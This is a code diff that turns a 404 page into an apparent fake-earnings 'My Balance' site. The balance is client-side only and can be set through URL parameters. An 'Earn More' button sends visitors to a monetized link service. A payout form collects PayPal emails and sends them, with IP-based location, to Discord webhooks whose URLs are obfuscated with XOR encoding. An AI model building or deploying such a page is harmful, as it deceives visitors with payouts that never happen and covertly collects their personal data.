@@ -1,77 +1,861 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex">
-  <title>ZeZo Hub | Page not found 404</title>
-  <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-    }
-    body {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #0d1117;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-      text-align: center;
-      overflow: hidden;
-    }
-    h1 {
-      position: relative;
-      z-index: 0;
-      font-size: 1.5rem;
-      font-weight: 600;
-      padding: 0 16px;
-      margin: 0;
-      color: #e6f4ff;
-    }
-    /* Kopie des Textes hinter der Schrift: nur der Leucht-Rand um die Buchstaben,
-       sichtbar durch eine Maske, die von links nach rechts wandert */
-    h1::after {
-      content: attr(data-text);
-      position: absolute;
-      /* Box größer als der Text, damit die Maske den Leuchtrand nicht abschneidet */
-      inset: -60px -80px;
-      z-index: -1;
-      padding: 60px 96px;
-      color: transparent;
-      text-shadow:
-        0 0 3px rgba(88, 166, 255, 1),
-        0 0 8px rgba(88, 166, 255, 0.9),
-        0 0 16px rgba(88, 166, 255, 0.7),
-        0 0 28px rgba(88, 166, 255, 0.5);
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-      -webkit-mask-image: linear-gradient(90deg,
-        transparent 0%, transparent 34%, rgba(0,0,0,.35) 42%, #000 50%, rgba(0,0,0,.35) 58%, transparent 66%, transparent 100%);
-      mask-image: linear-gradient(90deg,
-        transparent 0%, transparent 34%, rgba(0,0,0,.35) 42%, #000 50%, rgba(0,0,0,.35) 58%, transparent 66%, transparent 100%);
-      -webkit-mask-size: 300% 100%;
-      mask-size: 300% 100%;
-      -webkit-mask-repeat: no-repeat;
-      mask-repeat: no-repeat;
-      -webkit-mask-position: 100% 0;
-      mask-position: 100% 0;
-      animation: edge-sweep 2.8s linear infinite;
+<script>
+const CONFIG = {
+
+  // "Earn More" links, one is picked at random per click
+  earnLinks: [
+    "https://work.ink/2hRI/zezoearn"
+  ],
+
+  // true = open links in an iframe, false = new tab (some sites block iframes)
+  openInIframe: true,
+
+  defaultCurrency: "USD",
+  currencies: ["USD", "EUR", "GBP", "CHF", "JPY", "CAD", "AUD", "CNY", "SEK", "NOK", "PLN", "TRY", "INR", "BRL"],
+
+  // Minimum payout in EUR
+  minPayout: 1,
+
+  // Discord webhooks (stored encoded)
+  payoutWebhookUrl: "OQxDUR5gHV81EURCAihWXjIXWg4MKltfJh1VSQI1WQN+SQIXWGoHQmRBDhBeawJFZUgOEUIMcT88MFFnDGhfR2A2Qxg7HFogGB5ZWTcwBz8FMFF2CTRLAAkAAFslNgs7ACtuUwgiQTQIG0ERJABURR4pexdVOURHKA==",
+  webhookUrl: "OQxDUR5gHV81EURCAihWXjIXWg4MKltfJh1VSQI1WQN+SQIUVG8HQGFOAhVbYwdFaUAOFUI7C0k+VQ8QHTN5PR8sUHRYb3xHZRRxWSE2U0QAGXhUAwVIKhY1cnYYEnYECAkDQicWBj48CVtiCA9mJhA6W2kZDmEHKw==",
+
+  // Banned User IDs. The list in banListUrl (JSON array, e.g. ["1A2B3C4D"]) is re-checked in the background.
+  bannedUserIds: [],
+  banListUrl: "banned.json",
+  checkIntervalSeconds: 10,
+
+  // true = links without ?code=... are rejected
+  requireCode: false,
+
+  // Add the approximate location (from the IP) to the Discord embeds
+  trackLocation: true,
+
+  // URL parameters. Amounts are always in EUR.
+  // ?amount=5  ?pc=5&mobile=3&tablet=4  ?setbalance=25  ?code=ABC  ?uid=1A2B3C4D  ?currency=GBP
+  params: {
+    amount: "amount",
+    setBalance: "setbalance",
+    code: "code",
+    userId: "uid",
+    pc: "pc",
+    mobile: "mobile",
+    tablet: "tablet",
+    currency: "currency"
+  }
+};
+
+(function () {
+  var k = "Qx7!mZ2p";
+  function d(s) {
+    if (!s) return "";
+    var b = atob(s), o = "";
+    for (var i = 0; i < b.length; i++) o += String.fromCharCode(b.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+    return o;
+  }
+  CONFIG.payoutWebhookUrl = d(CONFIG.payoutWebhookUrl);
+  CONFIG.webhookUrl = d(CONFIG.webhookUrl);
+})();
+</script>
+
+<title>My Balance</title>
+<style>
+  * { box-sizing: border-box; }
+
+  :root { --ease: cubic-bezier(.22, 1, .36, 1); }
+
+  html, body { height: 100%; }
+  body {
+    margin: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    color: #f1f5f9;
+    background: radial-gradient(circle at 50% 40%, #1e1b4b 0%, #0f172a 55%, #020617 100%);
+    overflow: hidden;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .bg {
+    position: fixed;
+    inset: -20%;
+    z-index: 0;
+    pointer-events: none;
+    background:
+      radial-gradient(circle at 20% 25%, rgba(99,102,241,.6) 0, transparent 28%),
+      radial-gradient(circle at 80% 78%, rgba(34,197,94,.45) 0, transparent 28%);
+    opacity: .35;
+    will-change: transform;
+    animation: drift 18s ease-in-out infinite alternate;
+  }
+  @keyframes drift {
+    from { transform: translate3d(0, 0, 0); }
+    to   { transform: translate3d(4%, 3%, 0); }
+  }
+
+  .card {
+    position: relative;
+    z-index: 1;
+    background: #1e293b;
+    padding: 44px 56px;
+    border-radius: 24px;
+    text-align: center;
+    max-width: 92%;
+    border: 1px solid rgba(99,102,241,.4);
+    transition: transform .5s var(--ease);
+    animation: intro .9s var(--ease) backwards;
+  }
+  .card:hover { transform: translate3d(0, -5px, 0); }
+
+  @keyframes intro {
+    from { opacity: 0; transform: translate3d(0, 28px, 0) scale(.96); }
+    to   { opacity: 1; transform: translate3d(0, 0, 0) scale(1); }
+  }
+
+  .glow {
+    position: absolute;
+    inset: 0;
+    border-radius: inherit;
+    pointer-events: none;
+    z-index: -1;
+    box-shadow:
+      0 0 36px rgba(99,102,241,.6),
+      0 0 100px rgba(99,102,241,.4),
+      0 0 140px rgba(34,197,94,.22);
+    will-change: opacity;
+    animation: pulse 4s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: .5; }
+    50%      { opacity: 1; }
+  }
+
+  .label {
+    color: #94a3b8;
+    font-size: 13px;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+  }
+
+  .balance {
+    font-size: clamp(40px, 11vw, 64px);
+    font-weight: 800;
+    margin: 14px 0 12px;
+    font-variant-numeric: tabular-nums;
+    text-shadow: 0 0 14px rgba(99,102,241,.5);
+    transition: transform .45s var(--ease);
+  }
+  .balance.pop { transform: scale(1.07); }
+
+  .currency { margin-bottom: 8px; }
+  select {
+    appearance: none;
+    -webkit-appearance: none;
+    background-color: rgba(15, 23, 42, .9);
+    color: #cbd5e1;
+    border: 1px solid rgba(99,102,241,.4);
+    border-radius: 10px;
+    padding: 8px 32px 8px 14px;
+    font-size: 14px;
+    font-family: inherit;
+    cursor: pointer;
+    outline: none;
+    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'><path d='M1 1l5 5 5-5' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round'/></svg>");
+    background-repeat: no-repeat;
+    background-position: right 12px center;
+    transition: border-color .3s ease;
+  }
+  select:hover, select:focus { border-color: #a5b4fc; }
+
+  .selectwrap { position: relative; display: inline-block; }
+  .selectwrap select { color: transparent; }
+  .selectwrap select option { color: #cbd5e1; background: #0f172a; }
+  .selectwrap .shown {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 14px;
+    color: #cbd5e1;
+    pointer-events: none;
+  }
+
+  .message {
+    min-height: 24px;
+    color: #4ade80;
+    font-size: 15px;
+    margin-bottom: 22px;
+    opacity: 0;
+    transform: translate3d(0, 8px, 0);
+    transition: opacity .5s var(--ease), transform .5s var(--ease);
+  }
+  .message.show { opacity: 1; transform: translate3d(0, 0, 0); }
+  .message.error { color: #f87171; }
+
+  .buttons {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .btn {
+    display: inline-block;
+    padding: 15px 32px;
+    font-weight: 700;
+    font-size: 16px;
+    font-family: inherit;
+    border-radius: 14px;
+    text-decoration: none;
+    cursor: pointer;
+    border: 0;
+    transition: transform .35s var(--ease), background-color .3s ease, opacity .3s ease;
+  }
+  .btn:hover { transform: translate3d(0, -3px, 0) scale(1.04); }
+  .btn:active { transform: scale(.96); transition-duration: .1s; }
+  .btn:disabled { opacity: .5; cursor: not-allowed; transform: none; }
+
+  .btn.primary { background: #22c55e; color: #052e16; }
+  .btn.primary:hover { background: #4ade80; }
+  .btn.secondary {
+    background: transparent;
+    color: #e0e7ff;
+    border: 1px solid rgba(165,180,252,.6);
+  }
+  .btn.secondary:hover { background: rgba(99,102,241,.22); }
+
+  .overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    background: rgba(2, 6, 23, .8);
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity .35s var(--ease), visibility 0s linear .35s;
+  }
+  .overlay.open {
+    opacity: 1;
+    visibility: visible;
+    transition: opacity .35s var(--ease), visibility 0s;
+  }
+  .overlay.ban { z-index: 30; background: rgba(2, 6, 23, .96); }
+
+  .dialog {
+    width: 100%;
+    max-width: 400px;
+    background: #1e293b;
+    border: 1px solid rgba(99,102,241,.5);
+    border-radius: 20px;
+    padding: 28px;
+    text-align: left;
+    box-shadow: 0 0 60px rgba(99,102,241,.35);
+    transform: translate3d(0, 24px, 0) scale(.96);
+    transition: transform .45s var(--ease);
+  }
+  .overlay.open .dialog { transform: translate3d(0, 0, 0) scale(1); }
+  .dialog.center { text-align: center; border-color: rgba(248,113,113,.6); box-shadow: 0 0 60px rgba(248,113,113,.3); }
+  .dialog.center p { margin: 0; color: #94a3b8; font-size: 14px; line-height: 1.6; }
+  .dialog.center code { color: #f1f5f9; }
+
+  .viewer {
+    position: fixed;
+    inset: 0;
+    z-index: 20;
+    display: flex;
+    flex-direction: column;
+    padding: 16px;
+    gap: 10px;
+    background: rgba(2, 6, 23, .88);
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity .35s var(--ease), visibility 0s linear .35s;
+  }
+  .viewer.open { opacity: 1; visibility: visible; transition: opacity .35s var(--ease), visibility 0s; }
+  .viewer .bar { display: flex; gap: 10px; justify-content: flex-end; }
+  .viewer .bar .btn { padding: 10px 18px; font-size: 14px; }
+  .viewer .frame {
+    flex: 1;
+    width: 100%;
+    max-width: 1100px;
+    margin: 0 auto;
+    border: 1px solid rgba(99,102,241,.5);
+    border-radius: 16px;
+    background: #fff;
+    box-shadow: 0 0 60px rgba(99,102,241,.35);
+    transform: translate3d(0, 24px, 0) scale(.98);
+    transition: transform .45s var(--ease);
+  }
+  .viewer.open .frame { transform: translate3d(0, 0, 0) scale(1); }
+
+  .dialog h2 { margin: 0 0 18px; font-size: 22px; }
+  .dialog.center h2 { margin-bottom: 10px; }
+  .dialog label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 6px; }
+  .dialog label.next { margin-top: 14px; }
+  .dialog input {
+    width: 100%;
+    padding: 12px 14px;
+    background: #0f172a;
+    color: #f1f5f9;
+    border: 1px solid rgba(99,102,241,.4);
+    border-radius: 10px;
+    font-size: 16px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .3s ease;
+  }
+  .dialog input:focus { border-color: #a5b4fc; }
+  .dialog .hint {
+    min-height: 20px;
+    margin: 10px 0 16px;
+    font-size: 14px;
+    color: #f87171;
+    transition: color .3s ease;
+  }
+  .dialog .hint.info { color: #94a3b8; }
+  .dialog .actions { display: flex; gap: 10px; }
+  .dialog .actions .btn { flex: 1; padding: 13px 16px; font-size: 15px; }
+
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      animation: none !important;
+      transition-duration: .01s !important;
     }
-    /* Leuchten wandert von links nach rechts */
-    @keyframes edge-sweep {
-      from { -webkit-mask-position: 90% 0; mask-position: 90% 0; }
-      to   { -webkit-mask-position: 10% 0;  mask-position: 10% 0; }
-    }
-    @media (prefers-reduced-motion: reduce) {
-      h1::after {
-        animation: none;
-        -webkit-mask-image: none;
-        mask-image: none;
-        opacity: 0.6;
-      }
-    }
-  </style>
+  }
+  @media (max-width: 480px) {
+    .card { padding: 36px 24px; }
+    .btn { padding: 14px 24px; }
+  }
+</style>
 </head>
 <body>
-  <h1 data-text="This page does not exist.">This page does not exist.</h1>
+  <div class="bg"></div>
+
+  <div class="card">
+    <div class="glow"></div>
+    <div class="label">Your Balance</div>
+    <div class="balance" id="balance">0.00</div>
+    <div class="currency">
+      <div class="selectwrap">
+        <select id="currency" aria-label="Currency"></select>
+        <span class="shown" id="currencyShown"></span>
+      </div>
+    </div>
+    <div class="message" id="message"></div>
+    <div class="buttons">
+      <a class="btn primary" id="earn" href="#">Earn More</a>
+      <button class="btn secondary" id="payout" type="button">Payout</button>
+    </div>
+  </div>
+
+  <div class="viewer" id="viewer" aria-hidden="true">
+    <div class="bar">
+      <button class="btn primary" id="viewerClose" type="button">Close</button>
+    </div>
+    <iframe class="frame" id="viewerFrame" title="Earn More"
+      sandbox="allow-scripts allow-same-origin allow-forms"
+      referrerpolicy="no-referrer"></iframe>
+  </div>
+
+  <div class="overlay" id="overlay" aria-hidden="true">
+    <form class="dialog" id="form" novalidate>
+      <h2>Payout</h2>
+      <label for="paypal">PayPal email address</label>
+      <input id="paypal" type="email" inputmode="email" autocomplete="email" autocapitalize="none" spellcheck="false" placeholder="name@example.com">
+      <label class="next" for="amount" id="amountLabel">Amount</label>
+      <input id="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00">
+      <div class="hint" id="hint"></div>
+      <div class="actions">
+        <button class="btn secondary" id="cancel" type="button">Cancel</button>
+        <button class="btn primary" id="submit" type="submit">Request payout</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="overlay ban" id="banned" aria-hidden="true">
+    <div class="dialog center">
+      <h2>Banned</h2>
+      <p>Your account has been banned.<br>User ID: <code id="bannedId"></code></p>
+    </div>
+  </div>
+
+<script>
+(function () {
+  var C = CONFIG, P = C.params;
+  var BALANCE_KEY = "balance", CURRENCY_KEY = "currency";
+  var RATES_URL = "https://api.frankfurter.dev/v1/latest?base=EUR";
+  var EMBED_COLOR = 16766720;
+  var PLATFORM_NAMES = { pc: "PC", mobile: "Mobile", tablet: "Tablet" };
+
+  var $ = function (id) { return document.getElementById(id); };
+  var balanceEl = $("balance"), messageEl = $("message"), currencyEl = $("currency"),
+      earnEl = $("earn"), payoutBtn = $("payout"), overlay = $("overlay"),
+      form = $("form"), paypalEl = $("paypal"), hintEl = $("hint"),
+      submitEl = $("submit"), amountEl = $("amount"), amountLabelEl = $("amountLabel"),
+      viewerEl = $("viewer"), viewerFrame = $("viewerFrame"), bannedEl = $("banned");
+
+  var params = new URLSearchParams(window.location.search);
+  var framed = false;
+  try { framed = window.self !== window.top; } catch (e) { framed = true; }
+
+  function detectPlatform() {
+    var ua = navigator.userAgent || "";
+    var isTablet = /iPad|Tablet|PlayBook|Silk/i.test(ua) ||
+      (/Android/i.test(ua) && !/Mobile/i.test(ua)) ||
+      (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+    if (isTablet) return "tablet";
+    if (/Mobi|iPhone|iPod|Android/i.test(ua)) return "mobile";
+    return "pc";
+  }
+  var platform = detectPlatform();
+
+  function load(key) { try { return localStorage.getItem(key); } catch (e) { return null; } }
+  function save(key, v) { try { localStorage.setItem(key, String(v)); } catch (e) {} }
+  function getBalance() {
+    var v = parseFloat(load(BALANCE_KEY));
+    return isFinite(v) ? v : 0;
+  }
+
+  function getUserId() {
+    var id = load("uid");
+    if (!id) {
+      var a = new Uint8Array(4);
+      (window.crypto || window.msCrypto).getRandomValues(a);
+      id = Array.prototype.map.call(a, function (b) {
+        return ("0" + b.toString(16)).slice(-2);
+      }).join("").toUpperCase();
+      save("uid", id);
+    }
+    return id;
+  }
+
+  var rates = {
+    EUR: 1, USD: 1.08, GBP: 0.85, CHF: 0.94, JPY: 165, CAD: 1.47, AUD: 1.65,
+    CNY: 7.8, SEK: 11.5, NOK: 11.7, PLN: 4.3, TRY: 35, INR: 90, BRL: 6.0
+  };
+
+  function pickCurrency() {
+    var fromUrl = (params.get(P.currency) || "").toUpperCase();
+    if (C.currencies.indexOf(fromUrl) !== -1) { save(CURRENCY_KEY, fromUrl); return fromUrl; }
+    var stored = load(CURRENCY_KEY);
+    if (stored && C.currencies.indexOf(stored) !== -1) return stored;
+    return C.defaultCurrency;
+  }
+  var currency = pickCurrency();
+
+  function currencySymbol(code) {
+    try {
+      var parts = new Intl.NumberFormat("en-US", {
+        style: "currency", currency: code, currencyDisplay: "narrowSymbol"
+      }).formatToParts(0);
+      for (var i = 0; i < parts.length; i++) {
+        if (parts[i].type === "currency") return parts[i].value;
+      }
+    } catch (e) {}
+    return code;
+  }
+
+  C.currencies.forEach(function (code) {
+    var o = document.createElement("option");
+    o.value = code; o.textContent = currencySymbol(code) + " - " + code;
+    currencyEl.appendChild(o);
+  });
+  currencyEl.value = currency;
+  $("currencyShown").textContent = currency;
+
+  var formatter = null;
+  function buildFormatter() {
+    try {
+      formatter = new Intl.NumberFormat("en-US", {
+        style: "currency", currency: currency, currencyDisplay: "narrowSymbol"
+      });
+    } catch (e) { formatter = null; }
+  }
+  buildFormatter();
+
+  function format(eur) {
+    var v = eur * (rates[currency] || 1);
+    return formatter ? formatter.format(v) : v.toFixed(2) + " " + currency;
+  }
+
+  var shownEur = 0, targetEur = 0, lastText = "", animId = 0;
+
+  function render() {
+    var t = format(shownEur);
+    if (t !== lastText) { balanceEl.textContent = t; lastText = t; }
+  }
+  function pop() {
+    balanceEl.classList.add("pop");
+    setTimeout(function () { balanceEl.classList.remove("pop"); }, 300);
+  }
+  function animateTo(target, duration) {
+    targetEur = target;
+    var start = shownEur, t0 = performance.now(), id = ++animId;
+    function frame(now) {
+      if (id !== animId) return;
+      var p = Math.min((now - t0) / duration, 1);
+      var eased = 1 - Math.pow(1 - p, 4);
+      shownEur = start + (target - start) * eased;
+      render();
+      if (p < 1) requestAnimationFrame(frame);
+      else { shownEur = target; render(); }
+    }
+    requestAnimationFrame(frame);
+    pop();
+  }
+  function showMessage(text, isError) {
+    messageEl.textContent = text;
+    messageEl.classList.toggle("error", !!isError);
+    messageEl.classList.add("show");
+  }
+
+  currencyEl.addEventListener("change", function () {
+    currency = currencyEl.value;
+    $("currencyShown").textContent = currency;
+    save(CURRENCY_KEY, currency);
+    buildFormatter();
+    lastText = "";
+    animId++;
+    shownEur = targetEur;
+    render();
+    pop();
+    updateAmountField();
+  });
+
+  fetch(RATES_URL)
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (d && d.rates) {
+        rates = Object.assign({}, rates, d.rates, { EUR: 1 });
+        lastText = "";
+        render();
+      }
+    })
+    .catch(function () {});
+
+  var banned = false, remoteBans = [];
+
+  function isBanned() {
+    var id = getUserId();
+    return C.bannedUserIds.concat(remoteBans).some(function (x) {
+      return String(x).trim().toUpperCase() === id;
+    });
+  }
+
+  function applyBan() {
+    var b = isBanned();
+    if (b === banned) return;
+    banned = b;
+    $("bannedId").textContent = getUserId();
+    bannedEl.classList.toggle("open", b);
+    bannedEl.setAttribute("aria-hidden", b ? "false" : "true");
+    if (b) { closeViewer(); closePayout(); }
+  }
+
+  function checkBans() {
+    if (!C.banListUrl) { applyBan(); return Promise.resolve(); }
+    var url = C.banListUrl + (C.banListUrl.indexOf("?") === -1 ? "?" : "&") + "t=" + Date.now();
+    return fetch(url, { cache: "no-store" })
+      .then(function (r) { if (!r.ok) throw new Error("status"); return r.json(); })
+      .then(function (d) {
+        remoteBans = Array.isArray(d) ? d : (d && Array.isArray(d.banned) ? d.banned : []);
+        applyBan();
+      })
+      .catch(function () { applyBan(); });
+  }
+
+  function syncBalance() {
+    var b = getBalance();
+    if (Math.abs(b - targetEur) > 0.0001) animateTo(b, 800);
+  }
+
+  function openViewer(url) {
+    viewerFrame.src = url;
+    viewerEl.classList.add("open");
+    viewerEl.setAttribute("aria-hidden", "false");
+  }
+  function closeViewer() {
+    viewerEl.classList.remove("open");
+    viewerEl.setAttribute("aria-hidden", "true");
+    setTimeout(function () {
+      if (!viewerEl.classList.contains("open")) viewerFrame.src = "about:blank";
+    }, 400);
+  }
+
+  earnEl.addEventListener("click", function (e) {
+    e.preventDefault();
+    if (banned) return;
+    var link = C.earnLinks[Math.floor(Math.random() * C.earnLinks.length)];
+    if (C.openInIframe) openViewer(link);
+    else window.open(link, "_blank", "noopener");
+  });
+  $("viewerClose").addEventListener("click", closeViewer);
+  document.addEventListener("keydown", function (e) { if (e.key === "Escape") closeViewer(); });
+
+  window.addEventListener("message", function (e) {
+    if (e.origin !== window.location.origin || e.source !== viewerFrame.contentWindow) return;
+    if (!e.data || e.data.type !== "task-finished") return;
+    closeViewer();
+    setTimeout(function () {
+      animateTo(getBalance(), 1400);
+      if (e.data.message) showMessage(String(e.data.message), !!e.data.error);
+    }, 450);
+  });
+
+  function reportToParent(message, isError) {
+    if (!framed) return;
+    try {
+      window.parent.postMessage(
+        { type: "task-finished", message: message || "", error: !!isError },
+        window.location.origin
+      );
+    } catch (e) {}
+  }
+
+  function isValidEmail(v) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
+  }
+  function setHint(text, info) {
+    hintEl.textContent = text;
+    hintEl.classList.toggle("info", !!info);
+  }
+  function updateAmountField() {
+    amountLabelEl.textContent = "Amount (" + currency + ")";
+    amountEl.value = "";
+  }
+
+  function openPayout() {
+    if (banned) return;
+    updateAmountField();
+    setHint("");
+    submitEl.disabled = false;
+    overlay.classList.add("open");
+    overlay.setAttribute("aria-hidden", "false");
+    setTimeout(function () { paypalEl.focus({ preventScroll: true }); }, 250);
+  }
+  function closePayout() {
+    overlay.classList.remove("open");
+    overlay.setAttribute("aria-hidden", "true");
+    paypalEl.blur();
+  }
+
+  payoutBtn.addEventListener("click", openPayout);
+  $("cancel").addEventListener("click", closePayout);
+  overlay.addEventListener("click", function (e) { if (e.target === overlay) closePayout(); });
+  document.addEventListener("keydown", function (e) { if (e.key === "Escape") closePayout(); });
+
+  function fetchLocation() {
+    if (!C.trackLocation) return Promise.resolve("Not tracked");
+    var ctrl = window.AbortController ? new AbortController() : null;
+    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, 4000);
+    return fetch("https://ipwho.is/?fields=success,city,region,country", ctrl ? { signal: ctrl.signal } : {})
+      .then(function (r) { return r.json(); })
+      .then(function (d) {
+        clearTimeout(timer);
+        if (!d || d.success === false) return "Unknown";
+        var parts = [d.city, d.region, d.country].filter(Boolean);
+        return parts.length ? parts.join(", ") : "Unknown";
+      })
+      .catch(function () { clearTimeout(timer); return "Unknown"; });
+  }
+
+  function sendEmbed(url, title, fields, footerLabel) {
+    return fetchLocation().then(function (location) {
+      var now = new Date();
+      var time = now.toLocaleString("de-DE", {
+        timeZone: "Europe/Berlin",
+        day: "2-digit", month: "2-digit", year: "numeric",
+        hour: "2-digit", minute: "2-digit", second: "2-digit"
+      });
+      fields.push(
+        { name: "Platform", value: PLATFORM_NAMES[platform] || platform, inline: true },
+        { name: "Location", value: location, inline: true },
+        { name: "User ID", value: "`" + getUserId() + "`", inline: true }
+      );
+      return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: title,
+            color: EMBED_COLOR,
+            fields: fields,
+            footer: { text: footerLabel + " on " + time },
+            timestamp: now.toISOString()
+          }]
+        })
+      });
+    });
+  }
+
+  function notifyTask(amountEur, totalEur) {
+    if (!C.webhookUrl) return;
+    sendEmbed(C.webhookUrl, "Task completed", [
+      { name: "Amount", value: amountEur.toFixed(2) + " EUR", inline: true },
+      { name: "New balance", value: totalEur.toFixed(2) + " EUR", inline: true }
+    ], "Completed").catch(function () {});
+  }
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+    if (banned) return;
+    var email = paypalEl.value.trim();
+    var bal = getBalance();
+    var entered = parseFloat(amountEl.value.replace(",", "."));
+    var payoutEur = entered / (rates[currency] || 1);
+
+    if (bal < C.minPayout) {
+      setHint("Minimum payout is " + format(C.minPayout) + ". Keep earning!");
+      return;
+    }
+    if (!isValidEmail(email)) {
+      setHint("Please enter a valid PayPal email address.");
+      return;
+    }
+    if (!isFinite(entered) || entered <= 0) {
+      setHint("Please enter a valid amount.");
+      return;
+    }
+    if (payoutEur > bal + 0.005) {
+      setHint("Amount is higher than your balance.");
+      return;
+    }
+    if (payoutEur < C.minPayout - 0.005) {
+      setHint("Minimum payout is " + format(C.minPayout) + ".");
+      return;
+    }
+    if (payoutEur > bal) payoutEur = bal;
+    if (!C.payoutWebhookUrl) {
+      setHint("Payouts are currently not available.");
+      return;
+    }
+
+    var newBal = Math.max(0, bal - payoutEur);
+    var rounded = Math.round(payoutEur * 100) / 100;
+
+    submitEl.disabled = true;
+    setHint("Sending request...", true);
+
+    sendEmbed(C.payoutWebhookUrl, "Payout requested", [
+      { name: "PayPal email", value: email, inline: false },
+      { name: "Amount", value: rounded.toFixed(2) + " EUR", inline: true },
+      { name: "Shown as", value: format(rounded), inline: true },
+      { name: "Remaining balance", value: newBal.toFixed(2) + " EUR", inline: true }
+    ], "Requested")
+    .then(function (r) {
+      if (!r.ok) throw new Error("bad status");
+      save(BALANCE_KEY, newBal);
+      closePayout();
+      paypalEl.value = "";
+      setTimeout(function () {
+        animateTo(newBal, 1100);
+        showMessage("Payout requested. It will be sent to your PayPal.");
+      }, 250);
+    })
+    .catch(function () {
+      submitEl.disabled = false;
+      setHint("Request failed. Please try again later.");
+    });
+  });
+
+  function getUsedCodes() {
+    try { var a = JSON.parse(load("usedCodes")); return Array.isArray(a) ? a : []; }
+    catch (e) { return []; }
+  }
+  function markCodeUsed(code) {
+    if (!code) return;
+    var a = getUsedCodes();
+    if (a.indexOf(code) === -1) a.push(code);
+    save("usedCodes", JSON.stringify(a));
+  }
+
+  function readAmount() {
+    var raw = params.has(P[platform]) ? params.get(P[platform]) : params.get(P.amount);
+    return raw === null ? null : parseFloat(raw);
+  }
+
+  function start() {
+    var current = getBalance();
+    var hasAmount = [P.amount, P.pc, P.mobile, P.tablet].some(function (n) { return params.has(n); });
+    var wantsAction = params.has(P.setBalance) || hasAmount;
+    var linkCode = (params.get(P.code) || "").trim().slice(0, 64);
+
+    function outcome(message, isError, newBalance) {
+      if (framed) { reportToParent(message, isError); return; }
+      if (newBalance === undefined) {
+        if (message) showMessage(message, isError);
+        return;
+      }
+      setTimeout(function () {
+        animateTo(newBalance, 1400);
+        showMessage(message, isError);
+      }, 600);
+    }
+
+    if (params.toString()) history.replaceState(null, "", window.location.pathname);
+
+    if (!wantsAction) { reportToParent(""); return; }
+
+    if (banned) { outcome("", true); return; }
+
+    var onlyFor = params.get(P.userId);
+    if (onlyFor !== null && onlyFor.trim().toUpperCase() !== getUserId()) {
+      outcome("This link is not for you.", true);
+      return;
+    }
+    if (linkCode) {
+      if (getUsedCodes().indexOf(linkCode) !== -1) {
+        outcome("This link was already used.", true);
+        return;
+      }
+    } else if (C.requireCode) {
+      outcome("This link is missing its code.", true);
+      return;
+    }
+
+    if (params.has(P.setBalance)) {
+      var value = parseFloat((params.get(P.setBalance) || "").replace(",", "."));
+      if (!isFinite(value) || value < 0) { outcome("Invalid balance in the URL.", true); return; }
+      save(BALANCE_KEY, value);
+      markCodeUsed(linkCode);
+      targetEur = value;
+      outcome("Balance set to " + format(value), false, value);
+      return;
+    }
+
+    var amount = readAmount();
+    if (amount === null) { outcome("No amount for this device in the URL.", true); return; }
+    if (!isFinite(amount) || amount <= 0) { outcome("Invalid amount in the URL.", true); return; }
+
+    var total = current + amount;
+    save(BALANCE_KEY, total);
+    markCodeUsed(linkCode);
+    targetEur = total;
+    notifyTask(amount, total);
+    outcome("+" + format(amount) + " added", false, total);
+  }
+
+  shownEur = targetEur = getBalance();
+  render();
+
+  Promise.race([checkBans(), new Promise(function (r) { setTimeout(r, 2500); })]).then(start);
+
+  if (!framed) {
+    setInterval(function () {
+      checkBans();
+      syncBalance();
+    }, Math.max(1, C.checkIntervalSeconds) * 1000);
+  }
+})();
+</script>
 </body>
 </html>
